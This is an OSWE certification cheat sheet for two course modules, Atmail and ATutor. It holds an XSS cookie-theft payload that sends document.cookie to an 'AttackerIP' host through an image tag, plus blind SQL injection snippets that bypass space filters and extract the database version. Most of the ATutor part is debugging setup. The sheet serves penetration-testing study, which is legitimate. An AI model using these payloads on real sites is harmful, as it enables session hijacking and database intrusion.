# OSWE-cheat-sheet
OSWE-cheat sheet module by module with updated syllabus:

Module : Atmail (PHP):

1. Access and alert cookie payload (Httponly flag should be disable in set-Cookie headers)<br>
    #<script>alert(document.cookie);</script>
    
2. Run Python Server in python3<br>
    #python3 -m http.server
    
3. Embeded cookie steal payload in image tag<br>
    #function addImage() {<br>
    #var img = document.createElement('img');<br>
    #img.src = 'http://AttackerIP:port/' + document.cookie;<br>
    #document.body.appendChild(img);<br>
    #}<br>
    #addImage();<br>
    
4. Set cookie by web developer console<br>
    #javascript:void(document.cookie="cookiename=value");
 
5. XHR POST Request <br>
    #xhr= new XMLHttpRequest()<br>
    #xhr.open("POST", url, true)<br>
    #xhr.send(data)<br>
    
6. XHR GET Request <br>
    #xhr= new XMLHttpRequest()<br>
    #xhr.open("GET", url, true)<br>
    #xhr.send()<br>

 Module : ATutor Authentication Bypass and RCE (PHP) :<br>
 1. Enable MySQL DB logging<br>
    #nano /etc/mysql/my.cnf         // uncomment or add below line<br>
            #[mysqld]<br>
            #general_log_file = /var/log/mysql/mysql.log<br>
            #general_log = 1<br>
    #systemctl restart mysql        //Restart MySQL<br>
    #tail –f /var/log/mysql/mysql.log   //Access MySQL Log<br>
    
 2. Enable PHP verbose error<br>
    #nano /etc/php5/apache2/php.ini   //uncomment or add below line<br>
        #display_errors = On <br>
    #systemctl restart apache2     //Restart Apache<br>
    
3. Print statement in PHP<br>
    #echo "any message";<br>
    
4. Dump information about varaible<br>
    #var_dump($var);<br>
    
5. Serach for fiunction in code<br>
    #grep -rnw "function name(" ./ --color<br>
    
5. Check magic quote enable<br>
    #var_dump(get_magic_quotes_gpc());  /** for enable value is 1 **/<br>
    
6. MYSQL query without space<br>
    #mysql> select/**/1; <br>
    
7. Extract first character of MySql version in case of blind MySQL query<br>
    #mysql> select/**/ascii(substring((select/**/version()),1,1))=53;  /** use with "or" boolean **/<br>

    
